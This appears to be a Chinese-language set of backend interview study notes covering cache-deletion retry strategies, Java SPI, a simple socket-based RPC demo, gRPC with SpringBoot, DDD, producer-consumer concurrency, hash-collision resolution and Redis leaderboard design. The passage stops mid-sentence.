删缓存失败了怎么办：重试机制\n看似问题都已经解决了，但其实，还有一个问题没有考虑到，那就是删除缓存的操作，失败了怎么办？比如延时双删的时候，第二次缓存删除失败了，那不还是没有清除脏数据吗？解决方案就是再加上一个重试机制，保证删除缓存成功\n\n流程如下所示\n1. 更新数据库数据；\n2. 缓存因为种种问题删除失败\n3. 将需要删除的key发送至消息队列\n4. 自己消费消息，获得需要删除的key\n5. 继续重试删除操作，直到成功然而，\n\n该方案有一个缺点，对业务线代码造成大量的侵入。\n\n于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作\n\n#### binlog\n流程如下所示\n1. 更新数据库数据\n2. 数据库会将操作信息写入binlog日志当中\n3. 订阅程序提取出所需要的数据以及key\n4. 另起一段非业务代码，获得该信息\n5. 尝试删除缓存操作，发现删除失败\n6. 将这些信息发送至消息队列\n7. 重新从消息队列中获得该数据，重试操作。\n\n## 什么是SPI\nSPI 全称为 (Service Provider Interface) ，是JDK内置的一种服务提供发现机制\n\n### SPI 实践\n接下来我们来如何来利用 SPI 实现刚才提到的可拔插 IOC 容器。\n\n既然刚才都提到了 SPI 的本质就是面向接口编程，所以自然我们首先需要定义一个接口：\n\n![SPI图](./2024/05/26/场景设计面试题/1.png)\n\n其中包含了一些 Bean 容器所必须的操作：注册、获取、释放 bean。\n\n为了让其他人也能实现自己的 IOC 容器，所以我们将这个接口单独放到一个 Module 中，可供他人引入实现。\n\n![](./2024/05/26/场景设计面试题/2.png)\n\n所以当我要实现一个单例的 IOC 容器时，我只需要新建一个 Module 然后引入刚才的模块并实现 CicadaBeanFactory 接口即可。\n\n当然其中最重要的则是需要在 resources 目录下新建一个 META-INF/services/top.crossoverjie.cicada.base.bean.CicadaBeanFactory 文件，文件名必须得是我们之前定义接口的全限定名（SPI 规范）。\n![](./2024/05/26/场景设计面试题/3.png)\n\n其中的内容便是我们自己实现类的全限定名：\n```shell\ntop.crossoverjie.cicada.bean.ioc.CicadaIoc\n```\n可以想象最终会通过这里的全限定名来反射创建对象。\n\n只不过这个过程 Java 已经提供 API 屏蔽掉了：\n```java\npublic static CicadaBeanFactory getCicadaBeanFactory() {\n    ServiceLoader<CicadaBeanFactory> cicadaBeanFactories = ServiceLoader.load(CicadaBeanFactory.class);\n    if (cicadaBeanFactories.iterator().hasNext()){\n        return cicadaBeanFactories.iterator().next() ;\n    }\n    return new CicadaDefaultBean();\n}\n```\n当 classpath 中存在我们刚才的实现类（引入实现类的 jar 包），便可以通过 java.util.ServiceLoader 工具类来找到所有的实现类（可以有多个实现类同时存在，只不过通常我们只需要一个）。\n\n一些都准备好之后，使用自然就非常简单了。\n```xml\n<dependency>\n    <groupId>top.crossoverjie.opensource</groupId>\n    <artifactId>cicada-ioc</artifactId>\n    <version>2.0.4</version>\n</dependency>\n```\n我们只需要引入这个依赖便能使用它的实现，当我们想换一种实现方式时只需要更换一个依赖即可。\n\n这样就做到了不修改一行代码灵活的可拔插选择 IOC 容器了。\n\nSPI 的一些其他应用\n\nMySQL 的驱动包也是利用 SPI 来实现自己的连接逻辑。\n\n![](./2024/05/26/场景设计面试题/4.png)\n\n总结来说：\n\n- 提供一个接口\n- 在resource下新建META-INF/services目录，在目录下新建接口的全限定名文件\n- 服务方实现接口\n- 调用ServiceLoad.load()\n\n## 什么是RPC？\nRPC（Remote Procedure Call）远程过程调用，简单的理解是一个节点请求另一个节点提供的服务\n\n1. 首先客户端需要告诉服务器，需要调用的函数，这里函数和进程ID存在一个映射，客户端远程调用时，需要查一下函数，找到对应的ID，然后执行函数的代码。\n2. 客户端需要把本地参数传给远程函数，本地调用的过程中，直接压栈即可，但是在远程调用过程中不再同一个内存里，无法直接传递函数的参数，因此需要客户端把参数转换成字节流，传给服务端，然后服务端将字节流转换成自身能读取的格式，是一个序列化和反序列化的过程。\n3. 数据准备好了之后，如何进行传输？网络传输层需要把调用的ID和序列化后的参数传给服务端，然后把计算好的结果序列化传给客户端，因此TCP层即可完成上述过程，gRPC中采用的是HTTP2协议。\n\n总结一下：\n```text\n// Client端 \n//    Student student = Call(ServerAddr, addAge, student)\n1. 将这个调用映射为Call ID。\n2. 将Call ID，student（params）序列化，以二进制形式打包\n3. 把2中得到的数据包发送给ServerAddr，这需要使用网络传输层\n4. 等待服务器返回结果\n5. 如果服务器调用成功，那么就将结果反序列化，并赋给student，年龄更新\n\n// Server端\n1. 在本地维护一个Call ID到函数指针的映射call_id_map，可以用Map<String, Method> callIdMap\n2. 等待客户端请求\n3. 得到一个请求后，将其数据包反序列化，得到Call ID\n4. 通过在callIdMap中查找，得到相应的函数指针\n5. 将student（params）反序列化后，在本地调用addAge()函数，得到结果\n6. 将student结果序列化后通过网络返回给Client\n```\n\n- 在微服务的设计中，一个服务A如果访问另一个Module下的服务B，可以采用HTTP REST传输数据，并在两个服务之间进行序列化和反序列化操作，服务B把执行结果返回过来。\n- 由于HTTP在应用层中完成，整个通信的代价较高，远程过程调用中直接基于TCP进行远程调用，数据传输在传输层TCP层完成，更适合对效率要求比较高的场景，RPC主要依赖于客户端和服务端之间建立Socket链接进行，底层实现比REST更复杂。\n\n### RPC demo\n客户端\n```java\npublic class RPCClient<T> {\n    public static <T> T getRemoteProxyObj(final Class<?> serviceInterface, final InetSocketAddress addr) {\n        // 1.将本地的接口调用转换成JDK的动态代理，在动态代理中实现接口的远程调用\n        return (T) Proxy.newProxyInstance(serviceInterface.getClassLoader(), new Class<?>[]{serviceInterface},\n                new InvocationHandler() {\n                    @Override\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                        Socket socket = null;\n                        ObjectOutputStream output = null;\n                        ObjectInputStream input = null;\n                        try{\n                            // 2.创建Socket客户端，根据指定地址连接远程服务提供者\n                            socket = new Socket();\n                            socket.connect(addr);\n\n                            // 3.将远程服务调用所需的接口类、方法名、参数列表等编码后发送给服务提供者\n                            output = new ObjectOutputStream(socket.getOutputStream());\n                            output.writeUTF(serviceInterface.getName());\n                            output.writeUTF(method.getName());\n                            output.writeObject(method.getParameterTypes());\n                            output.writeObject(args);\n\n                            // 4.同步阻塞等待服务器返回应答，获取应答后返回\n                            input = new ObjectInputStream(socket.getInputStream());\n                            return input.readObject();\n                        }finally {\n                            if (socket != null){\n                                socket.close();\n                            }\n                            if (output != null){\n                                output.close();\n                            }\n                            if (input != null){\n                                input.close();\n                            }\n                        }\n                    }\n                });\n    }\n}\n```\n服务端\n```java\npublic class ServiceCenter implements Server {\n\n    private static ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());\n\n    private static final HashMap<String, Class> serviceRegistry = new HashMap<String, Class>();\n\n    private static boolean isRunning = false;\n\n    private static int port;\n\n\n    public ServiceCenter(int port){\n        ServiceCenter.port = port;\n    }\n\n\n    @Override\n    public void start() throws IOException {\n        ServerSocket server = new ServerSocket();\n        server.bind(new InetSocketAddress(port));\n        System.out.println(\"Server Start .....\");\n        try{\n            while(true){\n                executor.execute(new ServiceTask(server.accept()));\n            }\n        }finally {\n            server.close();\n        }\n    }\n\n    @Override\n    public void register(Class serviceInterface, Class impl) {\n        serviceRegistry.put(serviceInterface.getName(), impl);\n    }\n\n    @Override\n    public boolean isRunning() {\n        return isRunning;\n    }\n\n    @Override\n    public int getPort() {\n        return port;\n    }\n\n    @Override\n    public void stop() {\n        isRunning = false;\n        executor.shutdown();\n    }\n   private static class ServiceTask implements Runnable {\n        Socket client = null;\n\n        public ServiceTask(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            ObjectInputStream input = null;\n            ObjectOutputStream output = null;\n            try{\n                input = new ObjectInputStream(client.getInputStream());\n                String serviceName = input.readUTF();\n                String methodName = input.readUTF();\n                Class<?>[] parameterTypes = (Class<?>[]) input.readObject();\n                Object[] arguments = (Object[]) input.readObject();\n                Class serviceClass = serviceRegistry.get(serviceName);\n                if(serviceClass == null){\n                    throw new ClassNotFoundException(serviceName + \"not found!\");\n                }\n                Method method = serviceClass.getMethod(methodName, parameterTypes);\n                Object result = method.invoke(serviceClass.newInstance(), arguments);\n\n                output = new ObjectOutputStream(client.getOutputStream());\n                output.writeObject(result);\n            }catch (Exception e){\n                e.printStackTrace();\n            }finally {\n                if(output!=null){\n                    try{\n                        output.close();\n                    }catch (IOException e){\n                        e.printStackTrace();\n                    }\n                }\n                if (input != null) {\n                    try {\n                        input.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (client != null) {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n\npublic class ServiceProducerImpl implements ServiceProducer{\n    @Override\n    public String sendData(String data) {\n        return \"I am service producer!!!, the data is \"+ data;\n    }\n}\n\npublic class RPCTest {\n    public static void main(String[] args) throws IOException {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    Server serviceServer = new ServiceCenter(8088);\n                    serviceServer.register(ServiceProducer.class, ServiceProducerImpl.class);\n                    serviceServer.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n        ServiceProducer service = RPCClient.getRemoteProxyObj(ServiceProducer.class, new InetSocketAddress(\"localhost\", 8088));\n        System.out.println(service.sendData(\"test\"));\n    }\n}\n```\n\n## gRPC\n### gRPC与REST\n- REST通常以业务为导向，将业务对象上执行的操作映射到HTTP动词，格式非常简单，可以使用浏览器进行扩展和传输，通过JSON数据完成客户端和服务端之间的消息通信，直接支持请求/响应方式的通信。不需要中间的代理，简化了系统的架构，不同系统之间只需要对JSON进行解析和序列化即可完成数据的传递。\n- 但是REST也存在一些弊端，比如只支持请求/响应这种单一的通信方式，对象和字符串之间的序列化操作也会影响消息传递速度，客户端需要通过服务发现的方式，知道服务实例的位置，在单个请求获取多个资源时存在着挑战，而且有时候很难将所有的动作都映射到HTTP动词。\n- 正是因为REST面临一些问题，因此可以采用gRPC作为一种替代方案，gRPC 是一种基于二进制流的消息协议，可以采用基于Protocol Buffer的IDL定义grpc API,这是Google公司用于序列化结构化数据提供的一套语言中立的序列化机制，客户端和服务端使用HTTP/2以Protocol Buffer格式交换二进制消息。\n- gRPC的优势是，设计复杂更新操作的API非常简单，具有高效紧凑的进程通信机制，在交换大量消息时效率高，远程过程调用和消息传递时可以采用双向的流式消息方式，同时客户端和服务端支持多种语言编写，互操作性强；不过gRPC的缺点是不方便与JavaScript集成，某些防火墙不支持该协议。\n- 注册中心：当项目中有很多服务时，可以把所有的服务在启动的时候注册到一个注册中心里面，用于维护服务和服务器之间的列表，当注册中心接收到客户端请求时，去找到该服务是否远程可以调用，如果可以调用需要提供服务地址返回给客户端，客户端根据返回的地址和端口，去调用远程服务端的方法，执行完成之后将结果返回给客户端。这样在服务端加新功能的时候，客户端不需要直接感知服务端的方法，服务端将更新之后的结果在注册中心注册即可，而且当修改了服务端某些方法的时候，或者服务降级服务多机部署想实现负载均衡的时候，我们只需要更新注册中心的服务群即可。\n  ![](./2024/05/26/场景设计面试题/5.png)\n\n### demo\n这里使用SpringBoot+gRPC的形式实现RPC调用过程 项目结构分为三部分：client、grpc、server\n#### grpc\n![](./2024/05/26/场景设计面试题/6.png)\n```xml\n<dependency>\n      <groupId>io.grpc</groupId>\n      <artifactId>grpc-all</artifactId>\n       <version>1.12.0</version>\n </dependency>\n```\n```xml\n<build>\n        <extensions>\n            <extension>\n                <groupId>kr.motd.maven</groupId>\n                <artifactId>os-maven-plugin</artifactId>\n                <version>1.4.1.Final</version>\n            </extension>\n        </extensions>\n        <plugins>\n            <plugin>\n                <groupId>org.xolstice.maven.plugins</groupId>\n                <artifactId>protobuf-maven-plugin</artifactId>\n                <version>0.5.0</version>\n                <configuration>\n                    <pluginId>grpc-java</pluginId>\n                    <protocArtifact>com.google.protobuf:protoc:3.0.2:exe:${os.detected.classifier}</protocArtifact>\n                    <pluginArtifact>io.grpc:protoc-gen-grpc-java:1.2.0:exe:${os.detected.classifier}</pluginArtifact>\n                </configuration>\n                <executions>\n                    <execution>\n                        <goals>\n                            <goal>compile</goal>\n                            <goal>compile-custom</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n```\n创建.proto文件\n```protobuf\nsyntax = \"proto3\";   // 语法版本\n\n// stub选项\noption java_package = \"com.shgx.grpc.api\";\noption java_outer_classname = \"RPCDateServiceApi\";\noption java_multiple_files = true;\n\n// 定义包名\npackage com.shgx.grpc.api;\n\n// 服务接口定义，服务端和客户端都要遵守该接口进行通信\nservice RPCDateService {\n    rpc getDate (RPCDateRequest) returns (RPCDateResponse) {}\n}\n\n// 定义消息（请求）\nmessage RPCDateRequest {\n    string userName = 1;\n}\n\n// 定义消息（响应）\nmessage RPCDateResponse {\n    string serverDate = 1;\n}\n\n```\nmvn complie\n\n生成代码：\n![](./2024/05/26/场景设计面试题/7.png)\n\n#### client\n![](./2024/05/26/场景设计面试题/8.png)\n\n根据gRPC中的项目配置在client和server两个Module的pom.xml添加依赖\n```xml\n        <dependency>\n            <groupId>com.shgx</groupId>\n            <artifactId>grpc</artifactId>\n            <version>0.0.1-SNAPSHOT</version>\n            <scope>compile</scope>\n        </dependency>\n```\n编写GRPCClient\n```java\npublic class GRPCClient {\n    private static final String host = \"localhost\";\n    private static final int serverPort = 9999;\n\n    public static void main( String[] args ) throws Exception {\n        ManagedChannel managedChannel = ManagedChannelBuilder.forAddress( host, serverPort ).usePlaintext().build();\n        try {\n            RPCDateServiceGrpc.RPCDateServiceBlockingStub rpcDateService = RPCDateServiceGrpc.newBlockingStub( managedChannel );\n            RPCDateRequest rpcDateRequest = RPCDateRequest\n                    .newBuilder()\n                    .setUserName(\"shgx\")\n                    .build();\n            RPCDateResponse rpcDateResponse = rpcDateService.getDate( rpcDateRequest );\n            System.out.println( rpcDateResponse.getServerDate() );\n        } finally {\n            managedChannel.shutdown();\n        }\n    }\n}\n\n```\n#### server\n![](./2024/05/26/场景设计面试题/9.png)\n\n按照2.2.3 client的方式添加依赖\n\n创建RPCDateServiceImpl\n```java\npublic class RPCDateServiceImpl extends RPCDateServiceGrpc.RPCDateServiceImplBase{\n    @Override\n    public void getDate(RPCDateRequest request, StreamObserver<RPCDateResponse> responseObserver) {\n        RPCDateResponse rpcDateResponse = null;\n        Date now=new Date();\n        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"今天是\"+\"yyyy年MM月dd日 E kk点mm分\");\n        String nowTime = simpleDateFormat.format( now );\n        try {\n            rpcDateResponse = RPCDateResponse\n                    .newBuilder()\n                    .setServerDate( \"Welcome \" + request.getUserName()  + \", \" + nowTime )\n                    .build();\n        } catch (Exception e) {\n            responseObserver.onError(e);\n        } finally {\n            responseObserver.onNext( rpcDateResponse );\n        }\n        responseObserver.onCompleted();\n    }\n}\n```\n创建GRPCServer\n```java\npublic class GRPCServer {\n    private static final int port = 9999;\n    public static void main( String[] args ) throws Exception {\n        Server server = ServerBuilder.\n                forPort(port)\n                .addService( new RPCDateServiceImpl() )\n                .build().start();\n        System.out.println( \"grpc服务端启动成功, 端口=\" + port );\n        server.awaitTermination();\n    }\n}\n```\n## 一个优秀的RPC框架需要考虑的问题\n1. `微服务化`应用都基于微服务化，实现资源调用离不开远程调用\n2. `多实例问题` 一个服务可能有多个实例，你在调用时，要如何获取这些实例的地址呢？--- 这时候就需要一个服务注册中心，从服务注册中心获取服务的实例列表，再从中选择一个进行调用。\n3. `负载均衡` 选哪个调用好呢？这时候就需要负载均衡了，于是又得考虑如何实现复杂均衡\n4. `缓存` 总不能每次调用时都去注册中心查询实例列表吧，这样效率多低呀，于是又有了缓存，有了缓存，就要考虑缓存的更新问题\n5. `异步调用` 客户端总不能每次调用完都干等着服务端返回数据吧,于是就要支持异步调用;\n    - Future实现\n6. `版本控制` 服务端的接口修改了，老的接口还有人在用，怎么办？总不能让他们都改了吧？这就需要版本控制了；\n7. `线程池` 服务端总不能每次接到请求都马上启动一个线程去处理吧？于是就需要线程池；\n8. `未处理完的请求` 服务端关闭时，还没处理完的请求怎么办？是直接结束呢，还是等全部请求处理完再关闭呢？\n\n## 什么是DDD？\n### MVC\n要说DDD，不得不先看看MVC，我相信基本上99%的java开发读者，不管你是计科专业出身还是跨专业，初学spring或者springboot的时候，接触到的代码分层都是MVC\n这说明了MVC有它自身独有的优势：\n- 开发人员可以只关注整个结构中的其中某一层；\n- 可以很容易的用新的实现来替换原有层次的实现；\n- 可以降低层与层之间的依赖；\n- 有利于标准化；\n- 利于各层逻辑的复用。\n\n但是真实情况是这样吗？随着你系统功能迭代，业务逻辑越来越复杂之后。MVC三层中，V层作为数据载体，C层作为逻辑路由都是很薄的一层，大量的代码都堆积在了M层（模型层）。一个service的类，动辄几百上千行，大的甚至几万行，逻辑嵌套复杂，主业务逻辑不清晰。service做的稍微轻量化一点的，代码就像是胶水，把数据库执行逻辑与控制返回给前端的逻辑胶在一起，主次不清晰。\n一看你的工程，类啊，代码量啊都不少，你甚至不知道如何入手去修改“屎山”一样的代码。\n\n### 那么DDD为什么可以去解决以上的问题呢？\n\nDDD核心思想是什么呢？解耦！让业务不是像炒大锅饭一样混在一起，而是一道道工序复杂的美食，都有他们自己独立的做法。\n\nDDD的价值观里面，任何业务都是某个业务领域模型的职责体现。A领域只会去做A领域的事情，A领域想去修改B领域，需要找中介（防腐层）去对B领域完成操作。我想完成一个很长的业务逻辑动作，在划分好业务边界之后，交给业务服务的编排者（应用服务）去组织业务模型（聚合）完成逻辑。\n\n这样，每个服务（领域）只会做自己业务边界内的事情，最小细粒度的去定义需求的实现。原先空空的贫血模型摇身一变变成了充血模型。原理冗长的service里面类似到处set，get值这种与业务逻辑无关的数据载体包装代码，都会被去除，进到应用服务层，你的代码就是你的业务逻辑。逻辑清晰，可维护性高！\n\n### 什么样的系统适配DDD\n中小规模的系统，本身业务体量小，功能单一，选择mvc架构无疑是最好的。 项目化交付的系统，研发周期短，一天到晚按照甲方的需求定制功能。\n\n中大规模系统，产品化模式，业务可持续迭代，可预见的业务逻辑复杂性的系统。\n\n### DDD的代码怎么做\n\n// TODO\n\n## Java实现生产者消费者\n### wait()和notify()方法的实现\n```java\npublic class Test1 {\n    private static Integer count = 0;\n    private static final Integer FULL = 10;\n    private static String LOCK = \"lock\";\n    \n    public static void main(String[] args) {\n        Test1 test1 = new Test1();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                synchronized (LOCK) {\n                    while (count == FULL) {\n                        try {\n                            LOCK.wait();\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count++;\n                    System.out.println(Thread.currentThread().getName() + \"生产者生产，目前总共有\" + count);\n                    LOCK.notifyAll();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                synchronized (LOCK) {\n                    while (count == 0) {\n                        try {\n                            LOCK.wait();\n                        } catch (Exception e) {\n                        }\n                    }\n                    count--;\n                    System.out.println(Thread.currentThread().getName() + \"消费者消费，目前总共有\" + count);\n                    LOCK.notifyAll();\n                }\n            }\n        }\n    }\n}\n```\n### 可重入锁ReentrantLock的实现\n```java\npublic class Test2 {\n    private static Integer count = 0;\n    private static final Integer FULL = 10;\n    //创建一个锁对象\n    private Lock lock = new ReentrantLock();\n    //创建两个条件变量，一个为缓冲区非满，一个为缓冲区非空\n    private final Condition notFull = lock.newCondition();\n    private final Condition notEmpty = lock.newCondition();\n    public static void main(String[] args) {\n        Test2 test2 = new Test2();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                //获取锁\n                lock.lock();\n                try {\n                    while (count == FULL) {\n                        try {\n                            notFull.await();\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                    //唤醒消费者\n                    notEmpty.signal();\n                } finally {\n                    //释放锁\n                    lock.unlock();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                lock.lock();\n                try {\n                    while (count == 0) {\n                        try {\n                            notEmpty.await();\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                    notFull.signal();\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n}\n```\n#### 阻塞队列BlockingQueue的实现\n```java\npublic class Test3 {\n    private static Integer count = 0;\n    //创建一个阻塞队列\n    final BlockingQueue blockingQueue = new ArrayBlockingQueue<>(10);\n    public static void main(String[] args) {\n        Test3 test3 = new Test3();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                try {\n                    blockingQueue.put(1);\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                try {\n                    blockingQueue.take();\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n#### 信号量Semaphore的实现\n```java\npublic class Test4 {\n    private static Integer count = 0;\n    //创建三个信号量\n    final Semaphore notFull = new Semaphore(10);\n    final Semaphore notEmpty = new Semaphore(0);\n    final Semaphore mutex = new Semaphore(1);\n    public static void main(String[] args) {\n        Test4 test4 = new Test4();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                try {\n                    notFull.acquire();\n                    mutex.acquire();\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    mutex.release();\n                    notEmpty.release();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                try {\n                    notEmpty.acquire();\n                    mutex.acquire();\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    mutex.release();\n                    notFull.release();\n                }\n            }\n        }\n    }\n}\n\n```\n## Java实现BlockQueue\n```java\npublic class BlockingQueue<E> {\n\n    /**\n     * 有界队列内部固定长度，因此可以用数组实现\n     */\n    private Object[] elements;\n\n    /**\n     * 队列的头和尾下标\n     */\n    private int head = 0, tail = 0;\n\n    /**\n     * 队列目前的长度\n     */\n    private int size;\n    private ReentrantLock lock = new ReentrantLock();\n    private Condition notEmpty = lock.newCondition();\n    private Condition notFull = lock.newCondition();\n\n    public BlockingQueue(int capacity) {\n        this.elements = new Object[capacity];\n    }\n\n    public void put(E e) {\n        lock.lock();\n        try {\n            while (size == elements.length)\n                notFull.await();\n            elements[tail] = e;\n            if (++tail == elements.length) {\n                tail = 0;\n            }\n            size++;\n            notEmpty.signal();\n\n        } catch (InterruptedException ex) {\n            ex.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public E take() {\n        lock.lock();\n        E e = null;\n        try {\n            while (size == 0) {\n                notEmpty.await();\n            }\n            e = (E) elements[head];\n            elements[head] = null;\n            if (++head == elements.length)\n                head = 0;\n            size--;\n            notFull.signal();\n\n        } catch (InterruptedException ex) {\n            ex.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n        return e;\n    }\n\n    public int size() {\n        lock.lock();\n        try {\n            return size;\n        } finally {\n            lock.unlock();\n        }\n    }\n}\n```\n\n## 解决哈希冲突的方法\n### 开放定址法\n从发生冲突的那个单元起，按照一定的次序，从哈希表中找到一个空闲的单元。然后把发生冲突的元素存入到该单元的一种方法。开放定址法需要的表长度要大于等于所需要存放的元素。\n\n在开放定址法中解决冲突的方法有：线行探查法、平方探查法、双散列函数探查法。\n\n开放定址法的缺点在于删除元素的时候不能真的删除，否则会引起查找错误，只能做一个特殊标记。只到有下个元素插入才能真正删除该元素。\n\n#### 线行探查法\n线行探查法是开放定址法中最简单的冲突处理方法，它从发生冲突的单元起，依次判断下一个单元是否为空，当达到最后一个单元时，再从表首依次判断。直到碰到空闲的单元或者探查完全部单元为止。\n\n可以参考csdn上flash对该方法的演示：\nhttp://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf\n\n#### 平方探查法\n平方探查法即是发生冲突时，用发生冲突的单元d[i], 加上 1²、 2²等。即d[i] + 1²，d[i] + 2², d[i] + 3²…直到找到空闲单元。\n\n在实际操作中，平方探查法不能探查到全部剩余的单元。不过在实际应用中，能探查到一半单元也就可以了。若探查到一半单元仍找不到一个空闲单元，表明此散列表太满，应该重新建立。\n\n#### 双散列函数探查法\n这种方法使用两个散列函数hl和h2。其中hl和前面的h一样，以关键字为自变量，产生一个0至m—l之间的数作为散列地址；h2也以关键字为自变量，产生一个l至m—1之间的、并和m互素的数(即m不能被该数整除)作为探查序列的地址增量(即步长)，探查序列的步长值是固定值l；对于平方探查法，探查序列的步长值是探查次数i的两倍减l；对于双散列函数探查法，其探查序列的步长值是同一关键字的另一散列函数的值。\n\n### 链地址法（拉链法）\n链接地址法的思路是将哈希值相同的元素构成一个同义词的单链表，并将单链表的头指针存放在哈希表的第i个单元中，查找、插入和删除主要在同义词链表中进行。链表法适用于经常进行插入和删除的情况。\n\n如下一组数字,(32、40、36、53、16、46、71、27、42、24、49、64)哈希表长度为13，哈希函数为H(key)=key%13,则链表法结果如下：\n```java\n0       \n1  -> 40 -> 27 -> 53 \n2\n3  -> 16 -> 42\n4\n5\n6  -> 32 -> 71\n7  -> 46\n8\n9\n10 -> 36 -> 49\n11 -> 24\n12 -> 64\n```\n注：在java中，链接地址法也是HashMap解决哈希冲突的方法之一，jdk1.7完全采用单链表来存储同义词，jdk1.8则采用了一种混合模式，对于链表长度大于8的，会转换为红黑树存储。\n\n### 再哈希法\n就是同时构造多个不同的哈希函数：\n\nHi = RHi(key)   i= 1,2,3 … k;\n\n当H1 = RH1(key)  发生冲突时，再用H2 = RH2(key) 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。\n\n### 建立公共溢出区\n将哈希表分为公共表和溢出表，当溢出发生时，将所有溢出数据统一放到溢出区。\n\n## 排行榜设计\n### 基于数据库\n基于MySQL，order by\n\n缺点：\n- 速度慢\n### 基于Redis\n主要考察sort set 也就是zset\n\nzadd添加数据后，zrevrange获取排序后的排名\n\n### 类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\nkey的设计比较重要，比如aa用户和bb用户\n```shell\nzadd step:aa 1000 小明\nzadd step:bb 1000 小明\n```\n\n同理时间也可以通过key的设计解决\n```shell\nzadd step:aa:20210929 1000 小明\nzadd step:aa:20210929 1000 小明\n```\n\n但是上述设计会导致每个用户都有一个排行榜，存储的数据巨大，其实可以考虑只在用户查询时通过好友关系去生成\n\n那朋友圈排行榜的：微信头像、点赞数 怎么获取呢\n- 可以使用hmset hash储存对象，需要时通过zset储存的key去查询即可\n\n### 最近七天排行榜怎么弄\n前面我们说的都是每日排行榜。\n\n假设面试官要求我们提供一个最近七天、上一周、上一月、上个季度、这一年排行榜啥的，又该怎么搞呢？\n\n其实这还是在考察你对于 Redis 